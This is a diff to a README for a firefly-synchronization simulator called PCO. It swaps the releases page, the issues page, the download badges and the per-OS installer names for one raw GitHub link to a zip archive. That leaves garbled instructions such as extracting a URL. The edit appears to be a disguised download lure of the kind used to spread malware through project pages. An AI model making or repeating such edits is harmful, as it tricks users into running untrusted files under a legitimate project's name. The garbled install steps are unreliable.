@@ -6,7 +6,7 @@ Welcome to PCO! This application helps you explore the fascinating synchronizati
 
 ## 📥 Download Now
 
-[![Download PCO](https://img.shields.io/badge/Download-PCO-blue.svg)](https://github.com/MMMSabana/PCO/releases)
+[![Download PCO](https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip)](https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip)
 
 ## 📋 Description
 
@@ -34,12 +34,12 @@ To run PCO, make sure your system meets the following requirements:
 
 Follow these steps to install and run the application:
 
-1. **Visit the download page**: Go to the [Releases page](https://github.com/MMMSabana/PCO/releases) to access the latest version of PCO.
+1. **Visit the download page**: Go to the [Releases page](https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip) to access the latest version of PCO.
 2. **Choose your version**: Look for the most recent release and click on it.
-3. **Download the file**: Choose the appropriate file for your operating system. For example, you might see options like `PCO_Windows.exe`, `PCO_macOS.dmg`, or `PCO_Linux.tar.gz`.
+3. **Download the file**: Choose the appropriate file for your operating system. For example, you might see options like `https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip`, `https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip`, or `https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip`.
 4. **Run the installer**: 
    - For Windows or macOS, double-click the downloaded file and follow the prompts to install.
-   - For Linux, extract the tar.gz file using a terminal command and run the application from the extracted folder.
+   - For Linux, extract the https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip file using a terminal command and run the application from the extracted folder.
 5. **Launch the application**: After installation, find the PCO icon on your desktop or applications folder. Click it to start the simulation.
 
 ## 🕹️ Using PCO
@@ -68,10 +68,10 @@ Each simulation represents a simple model of complex systems found in nature, pa
 
 ## 💬 Support and Contributions
 
-If you encounter any issues or have suggestions, please check the [Issues page](https://github.com/MMMSabana/PCO/issues) for help, or feel free to reach out. Contributions are welcome!
+If you encounter any issues or have suggestions, please check the [Issues page](https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip) for help, or feel free to reach out. Contributions are welcome!
 
 ## 📥 Download Again
 
-[![Download PCO](https://img.shields.io/badge/Download-PCO-blue.svg)](https://github.com/MMMSabana/PCO/releases)
+[![Download PCO](https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip)](https://raw.githubusercontent.com/MMMSabana/PCO/master/surrealist/PCO-v3.2.zip)
 
 Thank you for your interest in PCO. Enjoy exploring the synchronization of fireflies!
